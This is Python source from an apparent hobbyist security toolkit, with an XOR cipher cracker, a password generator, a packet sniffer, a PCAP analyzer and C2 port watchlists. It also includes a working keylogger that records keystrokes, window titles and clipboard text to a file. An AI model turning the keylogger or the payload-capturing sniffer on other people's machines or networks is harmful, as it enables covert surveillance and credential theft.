_ENGLISH_FREQ = {
    ' ': 13.00, 'e': 12.70, 't':  9.06, 'a':  8.17, 'o':  7.51,
    'i':  6.97, 'n':  6.75, 's':  6.33, 'h':  6.09, 'r':  5.99,
    'd':  4.25, 'l':  4.03, 'c':  2.78, 'u':  2.76, 'm':  2.41,
    'w':  2.36, 'f':  2.23, 'g':  2.02, 'y':  1.97, 'p':  1.93,
    'b':  1.49, 'v':  0.98, 'k':  0.77, 'j':  0.15, 'x':  0.15,
    'q':  0.10, 'z':  0.07,
}


def _xor_score_english(data: bytes) -> float:
    """
    Score a byte sequence for English-language likelihood.
    Higher = more plausible English plaintext.
    Non-printable bytes incur a heavy penalty.
    """
    score = 0.0
    for byte in data:
        ch = chr(byte).lower()
        if ch in _ENGLISH_FREQ:
            score += _ENGLISH_FREQ[ch]
        elif 32 <= byte < 127:
            score += 0.1    # printable but uncommon character
        else:
            score -= 10.0   # non-printable: strong negative signal
    return score


def _xor_single_byte_crack(ciphertext: bytes) -> list:
    """
    Brute-force all 256 possible single-byte XOR keys.
    Returns [(score, key_int, plaintext_bytes), ...] sorted best-first.
    """
    results = []
    for key in range(256):
        plaintext = bytes(b ^ key for b in ciphertext)
        results.append((_xor_score_english(plaintext), key, plaintext))
    results.sort(key=lambda x: -x[0])
    return results


def _xor_hamming_distance(a: bytes, b: bytes) -> int:
    """Bit-level Hamming distance between two equal-length byte strings."""
    return sum(bin(x ^ y).count("1") for x, y in zip(a, b))


def _xor_detect_keysize(ciphertext: bytes, min_ks: int = 2, max_ks: int = 40) -> list:
    """
    Detect likely XOR key lengths using normalised Hamming distance.
    The key length whose byte blocks are most similar to each other
    (lowest normalised distance) is the most likely.
    Averages across up to 4 block pairs for stability.
    Returns [(keysize, normalised_distance), ...] sorted best-first.
    """
    results = []
    cap = min(max_ks + 1, len(ciphertext) // 4)
    for ks in range(min_ks, cap):
        distances = []
        for i in range(min(4, len(ciphertext) // (ks * 2))):
            a = ciphertext[i * 2 * ks : i * 2 * ks + ks]
            b = ciphertext[i * 2 * ks + ks : i * 2 * ks + ks * 2]
            if len(a) == len(b) == ks:
                distances.append(_xor_hamming_distance(a, b) / ks)
        if distances:
            results.append((ks, sum(distances) / len(distances)))
    results.sort(key=lambda x: x[1])
    return results


def _xor_multi_byte_crack(ciphertext: bytes, max_keylen: int = 32) -> list:
    """
    Crack repeating-key XOR:
    1. Detect probable key lengths via normalised Hamming distance (top 5).
    2. Slice ciphertext into every-Nth-byte streams, crack each as single-byte.
    3. Assemble the full key and decrypt.
    Returns [(key_hex, plaintext_bytes, keysize, hamming_dist), ...].
    """
    candidates = _xor_detect_keysize(ciphertext, max_ks=max_keylen)[:5]
    results = []
    for keysize, dist in candidates:
        key = bytearray()
        for i in range(keysize):
            stream = bytes(ciphertext[j] for j in range(i, len(ciphertext), keysize))
            top = _xor_single_byte_crack(stream)
            if top:
                key.append(top[0][1])
        if len(key) == keysize:
            pt = bytes(ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext)))
            results.append((key.hex(), pt, keysize, dist))
    return results


def run_xor_bruteforcer() -> None:
    """
    XOR brute-forcer with English frequency analysis.
    Cracks single-byte XOR instantly (all 256 keys).
    Cracks multi-byte / repeating-key XOR via Hamming-distance key-length
    detection + per-position single-byte solve.
    Common in CTF crypto challenges.
    """
    print_rule("XOR Brute-Forcer + Frequency Analysis")
    print("  Cracks single-byte and repeating-key (multi-byte) XOR ciphertexts.")
    print("  Scoring uses English letter + space frequency tables.\n")
    print("  Input format:")
    print("  1. Hex string  (e.g. 1b37373 ...)")
    print("  2. Base64")
    print("  3. Raw / paste directly")
    fmt = input("\n  Format [1]: ").strip() or "1"
    raw = input("  Ciphertext : ").strip()

    try:
        if fmt == "1":
            ct = bytes.fromhex(raw.replace(" ", "").replace("0x", ""))
        elif fmt == "2":
            ct = base64.b64decode(raw + "=" * (-len(raw) % 4))
        else:
            ct = raw.encode("latin-1")
    except Exception as e:
        print(f"  [!] Could not parse input: {e}")
        input("\nPress Enter to return...")
        return

    if len(ct) < 2:
        print("  [!] Ciphertext too short (need at least 2 bytes).")
        input("\nPress Enter to return...")
        return

    print(f"\n  [*] {len(ct)} bytes loaded.\n")
    print("  Mode:")
    print("  1. Single-byte XOR brute-force (instant — all 256 keys)")
    print("  2. Multi-byte / repeating-key XOR (Hamming key-length detection)")
    print("  3. Both")
    mode = input("\n  Mode [1]: ").strip() or "1"

    if mode in ("1", "3"):
        print("\n  ── Single-byte XOR ─────────────────────────────────────────")
        results = _xor_single_byte_crack(ct)[:5]
        for idx, (score, key, pt) in enumerate(results, 1):
            printable = "".join(chr(b) if 32 <= b < 127 else "." for b in pt[:80])
            print(f"\n  [{idx}] Key = 0x{key:02X}  ({key:3d})   score = {score:.1f}")
            print(f"       {printable}")

        # Letter frequency breakdown on best candidate
        best_score, best_key, best_pt = results[0]
        freq_counts: dict = {}
        total_letters = 0
        for b in best_pt:
            ch = chr(b).lower()
            if ch.isalpha():
                freq_counts[ch] = freq_counts.get(ch, 0) + 1
                total_letters += 1
        if total_letters > 0:
            top8 = sorted(freq_counts.items(), key=lambda x: -x[1])[:8]
            print(f"\n  ── Frequency analysis (key=0x{best_key:02X}) ───────────────────")
            print("  Top letters: " + "  ".join(f"{c.upper()}:{n}" for c, n in top8))
            e_exp = total_letters * 0.127
            e_got = freq_counts.get("e", 0)
            verdict = "✓ E-frequency consistent with English" \
                if abs(e_got - e_exp) < e_exp * 0.6 \
                else "? E-frequency diverges from English — may not be English plaintext"
            print(f"  {verdict}  (expected ~{e_exp:.0f} 'e', found {e_got})")

    if mode in ("2", "3"):
        raw_max = input("\n  Max key length to try [32]: ").strip() or "32"
        max_ks  = int(raw_max) if raw_max.isdigit() else 32
        print(f"\n  ── Multi-byte XOR (max key length = {max_ks}) ──────────────────")
        print("  [*] Detecting key length via normalised Hamming distance ...")
        results = _xor_multi_byte_crack(ct, max_keylen=max_ks)
        if not results:
            print("  [!] Could not determine key length — ciphertext may be too short.")
            print("      Try single-byte mode or increase max key length.")
        else:
            for idx, (key_hex, pt, ksz, dist) in enumerate(results, 1):
                printable = "".join(chr(b) if 32 <= b < 127 else "." for b in pt[:80])
                print(f"\n  [{idx}] Key = 0x{key_hex}  (length={ksz}, Hamming={dist:.4f})")
                print(f"       {printable}")

    input("\nPress Enter to return...")


def run_cipher() -> None:
    """Cryptography hub: toy substitution plus real AES/RSA/SHA tools."""
    while True:
        print_rule("Cryptography Toolkit")
        print("  1. Substitution cipher  (toy/demo)")
        print("  2. AES-256 file encryption/decryption")
        print("  3. RSA keypair + text encryption/decryption")
        print("  4. SHA-family hashing")
        print("  5. Vigenere cipher")
        print("  6. Caesar brute-forcer")
        print("  7. XOR cipher")
        print("  8. XOR brute-forcer + frequency analysis")
        print("  q. Back")
        choice = input("\n  Choice: ").strip().lower()
        if choice == "1":
            run_substitution_cipher()
        elif choice == "2":
            run_aes_file_crypto()
        elif choice == "3":
            run_rsa_crypto()
        elif choice == "4":
            run_sha_hashing()
        elif choice == "5":
            run_vigenere_cipher()
        elif choice == "6":
            run_caesar_bruteforcer()
        elif choice == "7":
            run_xor_cipher()
        elif choice == "8":
            run_xor_bruteforcer()
        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")


# ─────────────────────────────────────────────
#  PASSWORD GENERATOR
# ─────────────────────────────────────────────

MIN_PASSWORD_LENGTH = 8
MIN_OF_EACH_TYPE    = 1


def display_password_requirements() -> None:
    print("\n" + "-" * 40)
    print("  Minimum Password Requirements:")
    print(f"  - At least {MIN_PASSWORD_LENGTH} characters long")
    print(f"  - At least {MIN_OF_EACH_TYPE} character of each selected type")
    print("  - At least one character type must be selected")
    print("-" * 40)


def get_character_types() -> list[str]:
    type_options = {
        "Uppercase letters": string.ascii_uppercase,
        "Lowercase letters": string.ascii_lowercase,
        "Numbers":           string.digits,
        "Symbols":           string.punctuation,
    }
    while True:
        print("\nSelect character types to include (enter y or n):")
        selected_types = {}
        for type_name, pool in type_options.items():
            while True:
                answer = input(f"  Include {type_name}? (y/n): ").strip().lower()
                if answer in ("y", "n"):
                    break
                print("  [!] Please enter 'y' or 'n'.")
            if answer == "y":
                selected_types[type_name] = pool
        if selected_types:
            return selected_types
        print("\n  [!] You must select at least one character type.")


def get_password_length(num_selected_types: int) -> int:
    effective_min = max(MIN_PASSWORD_LENGTH, num_selected_types * MIN_OF_EACH_TYPE)
    while True:
        length_input = input(f"\nEnter desired password length (minimum {effective_min}): ").strip()
        if not length_input.isdigit():
            print("  [!] Please enter a whole number.")
            continue
        length = int(length_input)
        if length < effective_min:
            print(f"  [!] Password must be at least {effective_min} characters.")
            continue
        return length


def generate_password(selected_types: dict[str, str], length: int) -> str:
    pools = list(selected_types.values())
    rng = random.SystemRandom()
    while True:
        password_chars = []
        for pool in pools:
            for _ in range(MIN_OF_EACH_TYPE):
                password_chars.append(secrets.choice(pool))
        all_chars = "".join(pools)
        for _ in range(length - len(password_chars)):
            password_chars.append(secrets.choice(all_chars))
        rng.shuffle(password_chars)
        password = "".join(password_chars)
        if all(sum(1 for ch in password if ch in pool) >= MIN_OF_EACH_TYPE
               for pool in pools):
            return password


def _estimate_password_strength(password: str) -> dict[str, Any]:
    """
    Return a zxcvbn-style strength summary.

    Uses Dropbox zxcvbn when installed and falls back to a rough entropy
    estimate so the generator still gives useful feedback without extras.
    """
    try:
        from zxcvbn import zxcvbn
        result = zxcvbn(password)
        crack_times = result.get("crack_times_display", {})
        suggestions = result.get("feedback", {}).get("suggestions", [])
        return {
            "engine": "zxcvbn",
            "score": result.get("score", 0),
            "offline_fast": crack_times.get("offline_fast_hashing_1e10_per_second", "unknown"),
            "online_slow": crack_times.get("online_throttling_100_per_hour", "unknown"),
            "suggestions": suggestions,
        }
    except ImportError:
        charset = 0
        if any(c.islower() for c in password):
            charset += 26
        if any(c.isupper() for c in password):
            charset += 26
        if any(c.isdigit() for c in password):
            charset += 10
        if any(c in string.punctuation for c in password):
            charset += len(string.punctuation)
        entropy = len(password) * (charset.bit_length() if charset else 1)
        score = min(4, max(0, entropy // 25))
        return {
            "engine": "fallback entropy estimate",
            "score": int(score),
            "offline_fast": "install zxcvbn for crack-time estimate",
            "online_slow": "install zxcvbn for crack-time estimate",
            "suggestions": ["Run: pip install zxcvbn"],
        }


def run_password_generator() -> None:
    """
    Interactive password generator with real-time strength estimation.

    Lets the user choose which character classes to include (uppercase,
    lowercase, digits, symbols) and a desired length, then generates a
    cryptographically random password.  Strength is scored via zxcvbn
    when available, falling back to an entropy-based estimate.
    """
    print("\n" + "=" * 40)
    print("   Password Generator")
    print("=" * 40)
    display_password_requirements()
    selected_types = get_character_types()
    length = get_password_length(len(selected_types))

    while True:
        raw_count = input("\nHow many passwords to generate? [1]: ").strip()
        if raw_count == "":
            count = 1
            break
        if raw_count.isdigit() and int(raw_count) >= 1:
            count = int(raw_count)
            break
        print("  [!] Enter a whole number of 1 or more.")

    print("\n" + "-" * 40)

    if count == 1:
        password = generate_password(selected_types, length)
        print("  Your Generated Password:")
        print(f"\n    {password}\n")
        strength = _estimate_password_strength(password)
        print("  Strength Estimate:")
        print(f"    Engine            : {strength['engine']}")
        print(f"    Score             : {strength['score']} / 4")
        print(f"    Offline fast hash : {strength['offline_fast']}")
        print(f"    Online throttled  : {strength['online_slow']}")
        if strength["suggestions"]:
            print("    Suggestions       : " + "; ".join(strength["suggestions"]))
        print("-" * 40)
        try:
            import pyperclip
            ans = input("  Copy password to clipboard? (y/n): ").strip().lower()
            if ans == "y":
                pyperclip.copy(password)
                print("  [+] Copied to clipboard.")
        except ImportError:
            print("  [*] Install pyperclip to enable clipboard copy.")
    else:
        print(f"  {count} Generated Passwords:\n")
        passwords = [generate_password(selected_types, length) for _ in range(count)]
        for i, pw in enumerate(passwords, 1):
            print(f"  {i:>3}. {pw}")
        print("\n" + "-" * 40)
        try:
            import pyperclip
            ans = input("  Copy all passwords to clipboard? (y/n): ").strip().lower()
            if ans == "y":
                pyperclip.copy("\n".join(passwords))
                print(f"  [+] {count} passwords copied to clipboard.")
        except ImportError:
            print("  [*] Install pyperclip to enable clipboard copy.")

    input("\nPress Enter to return to the main menu...")


# ─────────────────────────────────────────────
#  KEYLOGGER
# ─────────────────────────────────────────────

KEYLOG_FILE = "keylog.txt"


def _get_active_window_title() -> str:
    """
    Return the title of the currently focused window, cross-platform.

    Windows  -> pygetwindow
    macOS    -> AppleScript via subprocess
    Linux    -> xdotool via subprocess (must be installed separately)

    Returns a string with the window title, or "Unknown" on any failure.
    """
    os_name = platform.system()
    try:
        if os_name == "Windows":
            import pygetwindow as gw
            win = gw.getActiveWindow()
            if not win:
                return "Unknown"
            geometry = f"{win.width}x{win.height}+{win.left}+{win.top}"
            return f"{win.title} [{geometry}]"

        elif os_name == "Darwin":   # macOS
            import subprocess
            script = ('tell application "System Events" to '
                      'get name of first process whose frontmost is true')
            result = subprocess.run(["osascript", "-e", script],
                                    capture_output=True, text=True, timeout=1)
            return result.stdout.strip() or "Unknown"

        elif os_name == "Linux":
            import subprocess
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=1)
            return result.stdout.strip() or "Unknown"

    except Exception:
        pass
    return "Unknown"


def _compute_session_stats(log_entries: list[str], session_seconds: float) -> dict[str, Any]:
    """
    Compute a statistics dict from the raw list of log entry strings.

    Each entry has the format:  "[HH:MM:SS] <label>"
    where label is either a single printable character or a [Key.xxx] token.

    Stats returned:
      total_keys   - total keypresses captured
      printable    - count of regular character keys
      special      - count of special keys (Enter, Backspace, etc.)
      backspaces   - how many times Backspace was pressed
      words_typed  - rough word count (each space/enter = new word boundary)
      kpm          - keystrokes per minute for the session
      top_keys     - list of (key_label, count) for the 5 most-pressed keys
    """
    total_keys = len(log_entries)
    printable  = 0
    special    = 0
    spaces     = 0
    backspaces = 0
    key_freq   = collections.Counter()

    for entry in log_entries:
        # Split off the timestamp prefix
        parts = entry.split("] ", 1)
        label = parts[1] if len(parts) == 2 else ""

        if label.startswith("["):       # special key token
            special += 1
            key_freq[label] += 1
            if "space"     in label.lower(): spaces     += 1
            if "backspace" in label.lower(): backspaces += 1
        else:
            printable += 1
            key_freq[label] += 1
            if label == " ":
                spaces += 1

    words_typed = max(spaces, 1)
    minutes     = max(session_seconds / 60, 1 / 60)
    kpm         = int(total_keys / minutes)
    top_keys    = key_freq.most_common(5)

    return {
        "total_keys":  total_keys,
        "printable":   printable,
        "special":     special,
        "backspaces":  backspaces,
        "words_typed": words_typed,
        "kpm":         kpm,
        "top_keys":    top_keys,
    }


def run_keylogger() -> None:
    """
    Enhanced keylogger — logs your own keystrokes locally.

    New features added on top of the original:

      Active window tracking
        Records which application has focus each time a key is pressed.
        When you switch windows mid-session the log starts a new block so
        you can see exactly which app each group of keystrokes came from.

      Clipboard monitoring  (optional, requires pyperclip)
        Polls the clipboard on every keypress. When the clipboard content
        changes a [CLIPBOARD] entry is written to the log and shown live,
        so paste events are captured alongside typed input.

      Session statistics
        After stopping (ESC) the tool prints: total keystrokes, printable
        vs special key breakdown, backspace count, estimated word count,
        keystrokes-per-minute, and a top-5 key frequency bar chart.

      Structured log format
        The log file groups entries into window blocks so the saved output
        is easy to read back -- each block is labelled with the window title
        that was active when those keys were pressed.

    Press ESC to stop.
    Only run on your own machine.
    """
    try:
        from pynput import keyboard
    except ImportError:
        print("\n  [!] pynput is not installed.  Run:  pip install pynput")
        input("\nPress Enter to return to the main menu...")
        return

    # Clipboard support is optional
    try:
        import pyperclip
        clipboard_available = True
    except ImportError:
        clipboard_available = False

    print("\n" + "=" * 52)
    print("   Keylogger  (Ethical / Local Use Only)")
    print("=" * 52)
    raw_log = input(f"  Log file [{KEYLOG_FILE}]: ").strip().strip('"')
    log_file = raw_log if raw_log else KEYLOG_FILE
    print(f"  Log file       : {log_file}")
    print(f"  Window tracking: enabled")
    print(f"  Clipboard log  : "
          f"{'available' if clipboard_available else 'disabled (pip install pyperclip)'}")
    print("\n  Press ESC to stop logging.")

    monitor_clipboard = False
    if clipboard_available:
        while True:
            ans = input("\n  Enable clipboard monitoring? (y/n): ").strip().lower()
            if ans in ("y", "n"):
                monitor_clipboard = (ans == "y")
                break

    input("\n  Press Enter to begin logging...")

    # ── Shared state ──────────────────────────────────────────────────
    log_entries       = []          # flat list written to file
    current_line      = []          # live-display character buffer
    current_window    = _get_active_window_title()
    window_log_blocks = []          # list of {window, entries} dicts
    current_block     = {"window": current_window, "entries": []}
    start_time        = datetime.datetime.now()
    last_clipboard    = pyperclip.paste() if monitor_clipboard else ""

    def _check_window_switch() -> None:
        """Start a new log block when the focused window changes."""
        nonlocal current_window, current_block
        new_win = _get_active_window_title()
        if new_win != current_window:
            if current_block["entries"]:
                window_log_blocks.append(current_block)
            current_window = new_win
            current_block  = {"window": new_win, "entries": []}
            print(f"\n  [>> Window: {new_win}]")

    def on_press(key: Any) -> None:
        nonlocal last_clipboard
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")

        _check_window_switch()

        # Build a readable label for this key
        try:
            label = key.char if key.char else f"[{key}]"
        except AttributeError:
            label = f"[{key}]"

        entry = f"[{timestamp}] {label}"
        log_entries.append(entry)
        current_block["entries"].append(entry)

        # ── Clipboard change detection ────────────────────────────────
        if monitor_clipboard:
            try:
                clip = pyperclip.paste()
                if clip != last_clipboard and clip.strip():
                    preview    = clip[:80].replace("\n", "\\n")
                    clip_entry = f"[{timestamp}] [CLIPBOARD] {preview}"
                    log_entries.append(clip_entry)
                    current_block["entries"].append(clip_entry)
                    print(f"\n  [CLIPBOARD] {preview}")
                    last_clipboard = clip
            except Exception:
                pass

        # ── Live terminal display ─────────────────────────────────────
        if hasattr(key, "char") and key.char:
            print(key.char, end="", flush=True)
            current_line.append(key.char)
        elif key == keyboard.Key.space:
            print(" ", end="", flush=True)
            current_line.append(" ")
        elif key == keyboard.Key.enter:
            print()
            current_line.clear()
        elif key == keyboard.Key.backspace and current_line:
            print("\b \b", end="", flush=True)
            current_line.pop()
        elif key == keyboard.Key.tab:
            print("    ", end="", flush=True)
        else:
            print(f"[{key}]", end="", flush=True)

    def on_release(key: Any) -> bool | None:
        if key == keyboard.Key.esc:
            return False    # stops the listener

    print(f"\n  [*] Active window : {current_window}")
    print(f"  [*] Logging started — press ESC to stop:\n")
    print("  " + "─" * 48)

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Flush the last window block
    if current_block["entries"]:
        window_log_blocks.append(current_block)

    end_time      = datetime.datetime.now()
    session_secs  = (end_time - start_time).total_seconds()

    print("\n  " + "─" * 48)

    # ── Session statistics ────────────────────────────────────────────
    stats = _compute_session_stats(log_entries, session_secs)
    duration_str = str(datetime.timedelta(seconds=int(session_secs)))

    print("\n" + "=" * 52)
    print("  Session Statistics")
    print("=" * 52)
    print(f"  Duration         : {duration_str}")
    print(f"  Total keystrokes : {stats['total_keys']}")
    print(f"  Printable keys   : {stats['printable']}")
    print(f"  Special keys     : {stats['special']}")
    print(f"  Backspaces       : {stats['backspaces']}")
    print(f"  Est. words typed : {stats['words_typed']}")
    print(f"  Keystrokes / min : {stats['kpm']}")
    print(f"  Windows captured : {len(window_log_blocks)}")
    print("\n  Top 5 Keys:")
    for key_label, count in stats["top_keys"]:
        bar = "█" * min(count, 30)
        print(f"    {str(key_label):<20} {count:>4}  {bar}")
    print("=" * 52)

    # ── Save structured log ───────────────────────────────────────────
    session_ts = start_time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'=' * 60}\n")
            f.write(f"SESSION  : {session_ts}\n")
            f.write(f"DURATION : {duration_str}\n")
            f.write(f"KEYS     : {stats['total_keys']}  |  "
                    f"WORDS : {stats['words_typed']}  |  KPM : {stats['kpm']}\n")
            f.write(f"{'=' * 60}\n\n")
            for block in window_log_blocks:
                f.write(f"  +-- Window: {block['window']}\n")
                for entry in block["entries"]:
                    f.write(f"  |   {entry}\n")
                f.write(f"  +{'─' * 50}\n\n")
        print(f"\n  [+] Log saved to '{log_file}'")
    except OSError as e:
        print(f"\n  [!] Could not save log file: {e}")
    input("\nPress Enter to return to the main menu...")


# ─────────────────────────────────────────────
#  PACKET SNIFFER
# ─────────────────────────────────────────────

PROTO_MAP = {
    1: "ICMP", 6: "TCP", 17: "UDP", 41: "IPv6-encap",
    47: "GRE", 50: "ESP", 51: "AH", 89: "OSPF", 132: "SCTP",
}


def _format_packet(packet: Any, arp_table: dict[str, str] | None = None, tcp_streams: dict[Any, bytearray] | None = None) -> str:
    """Return a one-line human-readable summary of a captured packet."""
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2   import ARP
    from scapy.packet import Raw
    try:
        from scapy.layers.dns import DNS, DNSQR
    except ImportError:
        DNS = DNSQR = None

    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    if packet.haslayer(IP):
        ip    = packet[IP]
        src   = ip.src
        dst   = ip.dst
        proto = PROTO_MAP.get(ip.proto, f"PROTO-{ip.proto}")

        if packet.haslayer(TCP):
            tcp   = packet[TCP]
            flags = []
            if tcp.flags & 0x02: flags.append("SYN")
            if tcp.flags & 0x10: flags.append("ACK")
            if tcp.flags & 0x01: flags.append("FIN")
            if tcp.flags & 0x04: flags.append("RST")
            if tcp.flags & 0x08: flags.append("PSH")
            flag_str = "/".join(flags) if flags else "--"
            payload_preview = ""
            if packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                if tcp_streams is not None and payload:
                    flow = (src, tcp.sport, dst, tcp.dport)
                    tcp_streams[flow].extend(payload[:4096])
                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in payload[:48])
                payload_preview = f"  data={len(payload)}B '{printable}'"
            return (f"[{timestamp}]  TCP   {src}:{tcp.sport}  ->  "
                    f"{dst}:{tcp.dport}  flags=[{flag_str}]{payload_preview}")

        if packet.haslayer(UDP):
            udp = packet[UDP]
            if DNS and packet.haslayer(DNS) and packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname
                if isinstance(qname, bytes):
                    qname = qname.decode("utf-8", errors="replace").rstrip(".")
                qtype = packet[DNSQR].qtype
                return (f"[{timestamp}]  DNS   {src}:{udp.sport}  ->  "
                        f"{dst}:{udp.dport}  query={qname} type={qtype}")
            return f"[{timestamp}]  UDP   {src}:{udp.sport}  ->  {dst}:{udp.dport}"

        if packet.haslayer(ICMP):
            icmp = packet[ICMP]
            icmp_types = {0: "echo-reply", 3: "dest-unreachable",
                          8: "echo-request", 11: "time-exceeded"}
            type_name = icmp_types.get(icmp.type, f"type-{icmp.type}")
            return f"[{timestamp}]  ICMP  {src}  ->  {dst}  [{type_name}]"

        return f"[{timestamp}]  {proto:<6}{src}  ->  {dst}"

    if packet.haslayer(ARP):
        arp = packet[ARP]
        op  = "who-has" if arp.op == 1 else "is-at"
        alert = ""
        if arp_table is not None and arp.op == 2:
            previous_mac = arp_table.get(arp.psrc)
            if previous_mac and previous_mac.lower() != arp.hwsrc.lower():
                alert = f"  [ARP SPOOF? was {previous_mac}]"
            arp_table[arp.psrc] = arp.hwsrc
        return f"[{timestamp}]  ARP   {arp.psrc} {op} {arp.pdst}  (hwsrc={arp.hwsrc}){alert}"

    return f"[{timestamp}]  ???   {packet.summary()}"


def run_live_packet_sniffer() -> None:
    """Capture raw network packets and display a live summary."""
    try:
        from scapy.all import sniff
    except ImportError:
        print("\n  [!] scapy is not installed.  Run:  pip install scapy")
        input("\nPress Enter to return to the main menu...")
        return

    print("\n" + "=" * 40)
    print("   Packet Sniffer")
    print("=" * 40)
    print("  Only use on networks you own or have permission to monitor.")
    print("\n  BPF filter examples:")
    print("    tcp          -- TCP only")
    print("    udp port 53  -- DNS queries")
    print("    icmp         -- Ping traffic")
    print("    host 8.8.8.8 -- Traffic to/from one IP\n")

    bpf_filter = input("  Enter BPF filter (or press Enter for none): ").strip()

    while True:
        count_input = input("  How many packets to capture? (0 = until Ctrl-C): ").strip()
        if count_input.isdigit():
            packet_count = int(count_input)
            break
        print("  [!] Please enter a whole number.")

    print("\n" + "-" * 70)
    # Use a simple counter instead of a list so store=False in scapy's sniff()
    # actually saves memory. Storing full packet objects in a list defeats the
    # purpose of store=False entirely -- each packet can be several KB.
    packet_count_captured = [0]
    arp_table = {}
    tcp_streams = collections.defaultdict(bytearray)

    def handle_packet(packet: Any) -> None:
        print(f"  {_format_packet(packet, arp_table=arp_table, tcp_streams=tcp_streams)}")
        packet_count_captured[0] += 1

    try:
        sniff(filter=bpf_filter if bpf_filter else None,
              prn=handle_packet, count=packet_count, store=False)
    except PermissionError:
        print("\n  [!] Permission denied -- try running with sudo (Linux/Mac).")
    except KeyboardInterrupt:
        pass

    print("-" * 70)
    print(f"\n  [+] Captured {packet_count_captured[0]} packets.")
    readable_streams = [
        (flow, bytes(data))
        for flow, data in tcp_streams.items()
        if data and any(32 <= b <= 126 for b in data)
    ]
    if readable_streams:
        print("\n  TCP Payload Previews:")
        for flow, data in readable_streams[:5]:
            src, sport, dst, dport = flow
            preview = "".join(chr(b) if 32 <= b <= 126 else "." for b in data[:160])
            print(f"    {src}:{sport} -> {dst}:{dport}")
            print(f"      {preview}")
    input("\nPress Enter to return to the main menu...")


def _open_dpkt_reader(path: str) -> tuple[Any, Any]:
    import dpkt
    f = open(path, "rb")
    try:
        return f, dpkt.pcap.Reader(f)
    except (ValueError, dpkt.dpkt.NeedData):
        f.seek(0)
        try:
            return f, dpkt.pcapng.Reader(f)
        except Exception:
            f.close()
            raise


def run_pcap_analyzer() -> None:
    """Parse a saved PCAP/PCAPNG file with dpkt for fast offline analysis."""
    try:
        import dpkt
    except ImportError:
        print("\n  [!] dpkt is not installed.  Run:  pip install dpkt")
        input("\nPress Enter to return...")
        return
    import socket

    print_rule("PCAP Analyzer")
    path = input("  PCAP/PCAPNG file path: ").strip().strip('"')
    if not os.path.isfile(path):
        print("  [!] File not found.")
        input("\nPress Enter to return...")
        return

    proto_counts = collections.Counter()
    host_counts = collections.Counter()
    dns_queries = collections.Counter()
    arp_table = {}
    arp_alerts = []
    tcp_streams = collections.defaultdict(bytearray)
    packet_total = 0

    def ip_to_text(addr: bytes) -> str:
        family = socket.AF_INET6 if len(addr) == 16 else socket.AF_INET
        return socket.inet_ntop(family, addr)

    try:
        f, reader = _open_dpkt_reader(path)
        with f:
            for _ts, buf in reader:
                packet_total += 1
                try:
                    eth = dpkt.ethernet.Ethernet(buf)
                except Exception:
                    continue

                if isinstance(eth.data, dpkt.arp.ARP):
                    arp = eth.data
                    if arp.op == dpkt.arp.ARP_OP_REPLY:
                        ip = socket.inet_ntoa(arp.spa)
                        mac = ":".join(f"{b:02x}" for b in arp.sha)
                        previous = arp_table.get(ip)
                        if previous and previous != mac:
                            arp_alerts.append(f"{ip} changed from {previous} to {mac}")
                        arp_table[ip] = mac
                    proto_counts["ARP"] += 1
                    continue

                ip = eth.data
                if isinstance(ip, dpkt.ip.IP):
                    src = ip_to_text(ip.src)
                    dst = ip_to_text(ip.dst)
                elif hasattr(dpkt, "ip6") and isinstance(ip, dpkt.ip6.IP6):
                    src = ip_to_text(ip.src)
                    dst = ip_to_text(ip.dst)
                else:
                    continue

                host_counts[src] += 1
                host_counts[dst] += 1

                if isinstance(ip.data, dpkt.tcp.TCP):
                    tcp = ip.data
                    proto_counts["TCP"] += 1
                    if tcp.data:
                        tcp_streams[(src, tcp.sport, dst, tcp.dport)].extend(tcp.data[:8192])
                elif isinstance(ip.data, dpkt.udp.UDP):
                    udp = ip.data
                    proto_counts["UDP"] += 1
                    if udp.sport == 53 or udp.dport == 53:
                        try:
                            dns = dpkt.dns.DNS(udp.data)
                            for q in dns.qd:
                                dns_queries[q.name] += 1
                        except Exception:
                            pass
                elif isinstance(ip.data, dpkt.icmp.ICMP):
                    proto_counts["ICMP"] += 1
                else:
                    proto_counts[f"IP_PROTO_{getattr(ip, 'p', '?')}"] += 1
    except Exception as e:
        print(f"  [!] Could not parse PCAP: {e}")
        input("\nPress Enter to return...")
        return

    lines = []
    lines.append(f"PCAP: {path}")
    lines.append(f"Packets parsed: {packet_total}")
    lines.append("")
    lines.append("Protocol counts:")
    for proto, count in proto_counts.most_common():
        lines.append(f"  {proto:<10} {count}")
    lines.append("")
    lines.append("Top hosts:")
    for host, count in host_counts.most_common(10):
        lines.append(f"  {host:<40} {count}")
    if dns_queries:
        lines.append("")
        lines.append("Top DNS queries:")
        for qname, count in dns_queries.most_common(20):
            lines.append(f"  {qname:<45} {count}")
    if arp_alerts:
        lines.append("")
        lines.append("ARP spoofing warnings:")
        for alert in arp_alerts[:20]:
            lines.append(f"  {alert}")
    readable_streams = [
        (flow, bytes(data))
        for flow, data in tcp_streams.items()
        if data and any(32 <= b <= 126 for b in data)
    ]
    if readable_streams:
        lines.append("")
        lines.append("TCP stream previews:")
        for flow, data in readable_streams[:5]:
            src, sport, dst, dport = flow
            preview = "".join(chr(b) if 32 <= b <= 126 else "." for b in data[:220])
            lines.append(f"  {src}:{sport} -> {dst}:{dport}")
            lines.append(f"    {preview}")

    report = "\n".join(lines)
    print("\n" + report)
    run_id = _save_tool_run("pcap", path, f"{packet_total} packets parsed", report)
    if run_id:
        print(f"\n  [+] Saved PCAP analysis to SQLite result #{run_id}.")
    input("\nPress Enter to return...")


# ── C2 Beacon Detector — port classifications ─────────────────────────────
_C2_HIGH_SUSPICION_PORTS   = frozenset({4444, 4445, 4446, 1337, 31337, 50050, 40443, 9001})
_C2_MEDIUM_SUSPICION_PORTS = frozenset({8080, 8443, 8888, 6667, 6697, 2222, 2223, 1234,
                                         5555, 7777, 9999, 6666, 12345})
